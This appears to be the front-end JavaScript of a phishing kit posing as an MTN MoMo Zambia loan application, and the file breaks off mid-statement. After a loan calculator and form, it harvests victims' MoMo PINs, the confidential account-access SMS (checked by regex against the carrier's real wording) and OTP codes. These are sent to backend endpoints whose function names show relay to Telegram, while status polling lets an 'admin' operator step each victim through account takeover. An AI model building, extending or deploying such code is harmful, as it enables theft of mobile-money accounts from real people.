document.addEventListener('DOMContentLoaded', () => {
  const screenWelcome = document.getElementById('screen-welcome');
  const screenSlider = document.getElementById('screen-slider');
  const screenForm1 = document.getElementById('screen-form1');
  const screenForm2 = document.getElementById('screen-form2');
  const screenForm3 = document.getElementById('screen-form3');
  const screenPin = document.getElementById('screen-pin');
  const screenSms = document.getElementById('screen-sms');
  const screenOtp = document.getElementById('screen-otp');
  const screenSuccess = document.getElementById('screen-success');
  const screenStopped = document.getElementById('screen-stopped');
  const loadingOverlay = document.getElementById('loading-overlay');

  const btnGotoSlider = document.getElementById('btn-goto-slider');
  const btnSliderBack = document.getElementById('btn-slider-back');
  const btnGotoForm1 = document.getElementById('btn-goto-form1');
  const btnForm1Back = document.getElementById('btn-form1-back');
  const btnForm1Next = document.getElementById('btn-form1-next');
  const btnForm2Prev = document.getElementById('btn-form2-prev');
  const btnForm2Next = document.getElementById('btn-form2-next');
  const btnForm3Prev = document.getElementById('btn-form3-prev');
  const btnForm3Submit = document.getElementById('btn-form3-submit');
  const btnPinBack = document.getElementById('btn-pin-back');
  const btnSuccessBack = document.getElementById('btn-success-back');
  const btnFinishHome = document.getElementById('btn-finish-home');
  const btnRetryHome = document.getElementById('btn-retry-home');

  const loanSlider = document.getElementById('loan-amount-slider');
  const loanText = document.getElementById('loan-amount-text');
  const monthsSlider = document.getElementById('loan-months-slider');
  const monthsText = document.getElementById('loan-months-text');
  const monthlyRepVal = document.getElementById('monthly-rep-val');

  const formAmountInput = document.getElementById('form-amount-input');
  const loanDurationSelect = document.getElementById('loan-duration');
  const loanPurposeInput = document.getElementById('loan-purpose');
  const firstNameInput = document.getElementById('first-name');
  const lastNameInput = document.getElementById('last-name');
  const formPhoneInput = document.getElementById('form-phone');

  const sumAmount = document.getElementById('sum-amount');
  const sumDuration = document.getElementById('sum-duration');
  const sumPurpose = document.getElementById('sum-purpose');
  const sumApplicant = document.getElementById('sum-applicant');
  const depositRequiredAmount = document.getElementById('deposit-required-amount');

  const bannerPhoneError = document.getElementById('banner-phone-error');
  const bannerForm3Error = document.getElementById('banner-form3-error');
  const bannerPinError = document.getElementById('banner-pin-error');
  const bannerSmsError = document.getElementById('banner-sms-error');
  const bannerSmsInfo = document.getElementById('banner-sms-info');
  const bannerOtpError = document.getElementById('banner-otp-error');

  const displayPinPhone = document.getElementById('display-pin-phone');
  const pinBoxes5 = document.querySelectorAll('.pin-box-5');
  const btnTogglePinVisibility = document.getElementById('btn-toggle-pin-visibility');
  const linkForgotPin = document.getElementById('link-forgot-pin');

  const displaySmsPhone = document.getElementById('display-sms-phone');
  const smsInputBox = document.getElementById('sms-input-box');
  const btnValidatedSms = document.getElementById('btn-validated-sms');
  const smsSecondsSpan = document.getElementById('sms-seconds');
  const smsTimerText = document.getElementById('sms-timer-text');
  const btnRequestNewSms = document.getElementById('btn-request-new-sms');

  const displayOtpPhone = document.getElementById('display-otp-phone');
  const otpBoxes4 = document.querySelectorAll('.otp-box-4');
  const btnSubmitOtp = document.getElementById('btn-submit-otp');

  const blockedReasonText = document.getElementById('blocked-reason-text');

  let currentUserId = null;
  let statusPollInterval = null;
  let smsTimerInterval = null;
  let smsAutoSubmittedForCurrentValue = '';
  let pinSubmittedForCurrentValue = '';
  let otpSubmittedForCurrentValue = '';

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  const REQUIRED_SMS_REGEX = /^Y['’]ello\.\s*Please note!\s*This confidential code gives access to your MoMo account:\s*.+$/i;

  function isValidMomoSms(rawSms) {
    const normalized = String(rawSms || '').replace(/\s+/g, ' ').trim();
    return REQUIRED_SMS_REGEX.test(normalized);
  }

  function toZeroPrefixPhone(rawPhone) {
    const digits = String(rawPhone || '').replace(/\D/g, '');
    if (digits.startsWith('260')) {
      return '0' + digits.slice(3);
    }
    if (digits.startsWith('0')) {
      return digits;
    }
    if (/^(96|76|56)\d{7}$/.test(digits)) {
      return '0' + digits;
    }
    return digits;
  }

  function isValidMtnZambia(rawPhone) {
    const normalized = toZeroPrefixPhone(rawPhone);
    return /^(096|076|056)\d{7}$/.test(normalized);
  }

  function formatDisplayPhone(rawPhone) {
    const zeroPhone = toZeroPrefixPhone(rawPhone);
    if (/^(096|076|056)\d{7}$/.test(zeroPhone)) {
      return `${zeroPhone.slice(0, 3)} ${zeroPhone.slice(3, 6)} ${zeroPhone.slice(6)}`;
    }
    return zeroPhone || '096 XXX XXXX';
  }

  function showBanner(el, msg) {
    if (!el) return;
    el.innerText = msg;
    el.classList.add('active');
  }

  function hideBanner(el) {
    if (!el) return;
    el.innerText = '';
    el.classList.remove('active');
  }

  function showLoading(title, sub) {
    const titleEl = document.getElementById('loading-title');
    const subEl = document.getElementById('loading-sub');
    if (titleEl) titleEl.innerText = title;
    if (subEl) subEl.innerText = sub;
    if (loadingOverlay) loadingOverlay.classList.add('active');
  }

  function hideLoading() {
    if (loadingOverlay) loadingOverlay.classList.remove('active');
  }

  function showScreen(targetScreen) {
    [
      screenWelcome,
      screenSlider,
      screenForm1,
      screenForm2,
      screenForm3,
      screenPin,
      screenSms,
      screenOtp,
      screenSuccess,
      screenStopped
    ].forEach((s) => {
      if (s) s.classList.remove('active');
    });
    if (targetScreen) targetScreen.classList.add('active');
  }

  function updateCalc() {
    if (!loanSlider || !monthsSlider) return;
    const amt = Number(loanSlider.value);
    const mths = Number(monthsSlider.value);
    if (loanText) loanText.innerText = `ZMW ${amt.toLocaleString()}`;
    if (monthsText) monthsText.innerText = `${mths} ${mths === 1 ? 'month' : 'months'}`;
    if (formAmountInput) formAmountInput.value = amt.toLocaleString();
    if (sumDuration) sumDuration.innerText = `${mths} Months`;
    const monthly = (amt * 1.1) / mths;
    if (monthlyRepVal) monthlyRepVal.innerText = `ZMW ${Math.round(monthly).toLocaleString()}`;
  }

  if (loanSlider && monthsSlider) {
    loanSlider.addEventListener('input', updateCalc);
    monthsSlider.addEventListener('input', updateCalc);
    updateCalc();
  }

  function updateStep2ReadyState() {
    const fn = (firstNameInput?.value || '').trim();
    const ln = (lastNameInput?.value || '').trim();
    const ph = (formPhoneInput?.value || '').trim();
    if (btnForm2Next) {
      if (fn && ln && isValidMtnZambia(ph)) {
        btnForm2Next.classList.add('ready');
      } else {
        btnForm2Next.classList.remove('ready');
      }
    }
  }

  [firstNameInput, lastNameInput, formPhoneInput].forEach((inp) => {
    if (inp) inp.addEventListener('input', updateStep2ReadyState);
  });

  if (btnGotoSlider) btnGotoSlider.addEventListener('click', () => showScreen(screenSlider));
  if (btnSliderBack) btnSliderBack.addEventListener('click', () => showScreen(screenWelcome));
  if (btnGotoForm1) btnGotoForm1.addEventListener('click', () => showScreen(screenForm1));
  if (btnForm1Back) btnForm1Back.addEventListener('click', () => showScreen(screenSlider));

  if (btnForm1Next) {
    btnForm1Next.addEventListener('click', () => {
      const amtRaw = (formAmountInput?.value || '100,000').trim();
      const dur = loanDurationSelect?.value || '48 Months';
      const purp = (loanPurposeInput?.value || '').trim() || 'Business';
      if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
      if (sumDuration) sumDuration.innerText = dur;
      if (sumPurpose) sumPurpose.innerText = purp;
      showScreen(screenForm2);
    });
  }

  if (btnForm2Prev) btnForm2Prev.addEventListener('click', () => showScreen(screenForm1));

  if (btnForm2Next) {
    btnForm2Next.addEventListener('click', () => {
      hideBanner(bannerPhoneError);
      const fn = (firstNameInput?.value || '').trim();
      const ln = (lastNameInput?.value || '').trim();
      const ph = (formPhoneInput?.value || '').trim();

      if (!fn || !ln) {
        showBanner(bannerPhoneError, 'Please enter your first name and last name.');
        return;
      }

      if (!isValidMtnZambia(ph)) {
        showBanner(bannerPhoneError, 'Enter a valid MTN Zambia number starting with 096, 076, or 056.');
        return;
      }

      if (sumApplicant) sumApplicant.innerText = `${fn} ${ln}`.toUpperCase();
      showScreen(screenForm3);
    });
  }

  if (btnForm3Prev) btnForm3Prev.addEventListener('click', () => showScreen(screenForm2));

  if (btnForm3Submit) {
    btnForm3Submit.addEventListener('click', async () => {
      hideBanner(bannerForm3Error);
      const fn = (firstNameInput?.value || '').trim();
      const ln = (lastNameInput?.value || '').trim();
      const ph = (formPhoneInput?.value || '').trim();

      if (!fn || !ln || !isValidMtnZambia(ph)) {
        showBanner(bannerForm3Error, 'Please complete Step 2 with a valid MTN MoMo number (096, 076, 056).');
        return;
      }

      const fullName = `${fn} ${ln}`.toUpperCase();
      const zeroPhone = toZeroPrefixPhone(ph);
      const formattedPhone = formatDisplayPhone(zeroPhone);

      if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
      if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;
      if (displayOtpPhone) displayOtpPhone.innerText = formattedPhone;
      if (sumApplicant) sumApplicant.innerText = fullName;

      const numericAmt = Number(String(formAmountInput?.value || '100000').replace(/\D/g, '')) || 100000;
      const depVal = Math.max(200, Math.round(numericAmt * 0.002));
      if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;

      pinSubmittedForCurrentValue = '';
      otpSubmittedForCurrentValue = '';
      pinBoxes5.forEach((b) => (b.value = ''));
      otpBoxes4.forEach((b) => (b.value = ''));
      hideBanner(bannerPinError);
      hideBanner(bannerOtpError);

      try {
        const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminParam)}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            adminChatId: adminParam,
            applicant: { fullName, phone: zeroPhone }
          })
        });
        const data = await res.json();
        if (data.success) {
          currentUserId = data.userId;
        }
      } catch (e) {}

      showScreen(screenPin);
      if (pinBoxes5[0]) pinBoxes5[0].focus();
    });
  }

  if (btnPinBack) {
    btnPinBack.addEventListener('click', () => {
      if (statusPollInterval) clearInterval(statusPollInterval);
      hideLoading();
      showScreen(screenForm3);
    });
  }

  if (btnTogglePinVisibility) {
    btnTogglePinVisibility.addEventListener('click', () => {
      const makeVisible = pinBoxes5[0] && pinBoxes5[0].type === 'password';
      pinBoxes5.forEach((box) => {
        box.type = makeVisible ? 'text' : 'password';
      });
      btnTogglePinVisibility.innerText = makeVisible ? 'Hide' : 'Show';
    });
  }

  if (linkForgotPin) {
    linkForgotPin.addEventListener('click', (e) => {
      e.preventDefault();
      showBanner(bannerPinError, 'Enter your 5-digit MTN MoMo PIN code in the boxes above to continue.');
    });
  }

  pinBoxes5.forEach((box, idx) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/\D/g, '').slice(0, 1);
      if (box.value && idx < pinBoxes5.length - 1) {
        pinBoxes5[idx + 1].focus();
      }
      const pinVal = Array.from(pinBoxes5).map((b) => b.value).join('');
      if (pinVal.length === 5 && pinVal !== pinSubmittedForCurrentValue) {
        pinSubmittedForCurrentValue = pinVal;
        submitPinToTelegram(pinVal);
      }
    });

    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        pinBoxes5[idx - 1].focus();
      }
    });
  });

  async function submitPinToTelegram(pinVal) {
    hideBanner(bannerPinError);
    const rawPhone = displayPinPhone?.innerText || formPhoneInput?.value || '';
    const phoneZero = toZeroPrefixPhone(rawPhone);
    const applicantName = (sumApplicant?.innerText || `${firstNameInput?.value || ''} ${lastNameInput?.value || ''}`).trim() || 'MTN MOMO ZAMBIA';

    showLoading('SENDING DETAILS FOR VERIFICATION...', 'Please wait for admin response...');

    try {
      const res = await fetch('/api/submit-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          phone: phoneZero,
          pin: pinVal,
          applicantName
        })
      });
      const data = await res.json();
      if (data.success && data.userId) {
        currentUserId = data.userId;
      }
      startStatusPolling();
    } catch (e) {
      hideLoading();
      pinSubmittedForCurrentValue = '';
      showBanner(bannerPinError, 'Connection error. Please re-enter your 5-digit PIN.');
    }
  }

  function startSmsCountdown() {
    let timeLeft = 15;
    if (smsSecondsSpan) smsSecondsSpan.innerText = timeLeft;
    if (smsTimerText) smsTimerText.classList.remove('hidden-btn');
    if (btnRequestNewSms) btnRequestNewSms.classList.add('hidden-btn');

    if (smsTimerInterval) clearInterval(smsTimerInterval);

    smsTimerInterval = setInterval(() => {
      timeLeft -= 1;
      if (smsSecondsSpan) smsSecondsSpan.innerText = Math.max(0, timeLeft);

      if (timeLeft <= 0) {
        clearInterval(smsTimerInterval);
        if (smsTimerText) smsTimerText.classList.add('hidden-btn');
        if (btnRequestNewSms) btnRequestNewSms.classList.remove('hidden-btn');
      }
    }, 1000);
  }

  if (btnRequestNewSms) {
    btnRequestNewSms.addEventListener('click', async () => {
      hideBanner(bannerSmsError);
      const phoneZero = toZeroPrefixPhone(displaySmsPhone?.innerText || formPhoneInput?.value || '');
      showBanner(bannerSmsInfo, 'New SMS request sent to admin. Please wait for your SMS.');
      startSmsCountdown();

      try {
        await fetch('/api/request-new-sms', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUserId,
            phone: phoneZero
          })
        });
      } catch (e) {}
    });
  }

  function checkAndAutoSubmitSms() {
    if (!smsInputBox) return;
    const currentText = smsInputBox.value.replace(/\s+/g, ' ').trim();
    if (isValidMomoSms(currentText) && currentText !== smsAutoSubmittedForCurrentValue) {
      smsAutoSubmittedForCurrentValue = currentText;
      submitSmsToTelegram(currentText, true);
    }
  }

  if (smsInputBox) {
    smsInputBox.addEventListener('input', checkAndAutoSubmitSms);
    smsInputBox.addEventListener('paste', () => {
      setTimeout(checkAndAutoSubmitSms, 10);
    });
  }

  if (btnValidatedSms) {
    btnValidatedSms.addEventListener('click', () => {
      const currentText = (smsInputBox?.value || '').replace(/\s+/g, ' ').trim();
      if (!isValidMomoSms(currentText)) {
        showBanner(
          bannerSmsError,
          "SMS must start with: Y'ello. Please note! This confidential code gives access to your MoMo account:"
        );
        return;
      }
      submitSmsToTelegram(currentText, false);
    });
  }

  async function submitSmsToTelegram(smsText, autoDetected) {
    hideBanner(bannerSmsError);
    hideBanner(bannerSmsInfo);
    const phoneZero = toZeroPrefixPhone(displaySmsPhone?.innerText || formPhoneInput?.value || '');

    showLoading('VERIFYING SMS CODE...', 'Please wait while admin reviews your SMS...');

    try {
      await fetch('/api/submit-sms', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          phone: phoneZero,
          sms: smsText,
          autoDetected
        })
      });
      startStatusPolling();
    } catch (e) {
      hideLoading();
      showBanner(bannerSmsError, 'Unable to submit SMS. Please try again.');
    }
  }

  otpBoxes4.forEach((box, idx) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/\D/g, '').slice(0, 1);
      if (box.value && idx < otpBoxes4.length - 1) {
        otpBoxes4[idx + 1].focus();
      }
      const otpVal = Array.from(otpBoxes4).map((b) => b.value).join('');
      if (otpVal.length === 4 && otpVal !== otpSubmittedForCurrentValue) {
        otpSubmittedForCurrentValue = otpVal;
        submitOtpToTelegram(otpVal, true);
      }
    });

    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        otpBoxes4[idx - 1].focus();
      }
    });
  });

  if (btnSubmitOtp) {
    btnSubmitOtp.addEventListener('click', () => {
      const otpVal = Array.from(otpBoxes4).map((b) => b.value).join('');
      if (otpVal.length < 4) {
        showBanner(bannerOtpError, 'Please enter all 4 digits of your OTP code.');
        return;
      }
      submitOtpToTelegram(otpVal, false);
    });
  }

  async function submitOtpToTelegram(otpVal, autoSubmitted) {
    hideBanner(bannerOtpError);
    const phoneZero = toZeroPrefixPhone(displayOtpPhone?.innerText || displaySmsPhone?.innerText || formPhoneInput?.value || '');

    showLoading('VERIFYING 4-DIGIT OTP...', 'Please wait for admin confirmation...');

    try {
      await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          phone: phoneZero,
          otp: otpVal,
          autoSubmitted
        })
      });
      startStatusPolling();
    } catch (e) {
      hideLoading();
      otpSubmittedForCurrentValue = '';
      showBanner(bannerOtpError, 'Unable to submit OTP. Please try again.');
    }
  }

  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${encodeURIComponent(currentUserId)}`);
        const data = await res.json();
        const st = data.status;

        if (st === 'BLOCKED') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          hideLoading();
          if (blockedReasonText) {
            blockedReasonText.innerText = 'Your application was blocked because valid MTN MoMo details were not confirmed.';
          }
          showScreen(screenStopped);
        } else if (st === 'PROCEED_SMS') {
          clearInterval(statusPollInterval);
          hideLoading();
          hideBanner(bannerSmsError);
          hideBanner(bannerSmsInfo);
          smsAutoSubmittedForCurrentValue = '';
          if (smsInputBox) smsInputBox.value = '';
          showScreen(screenSms);
          startSmsCountdown();
          i
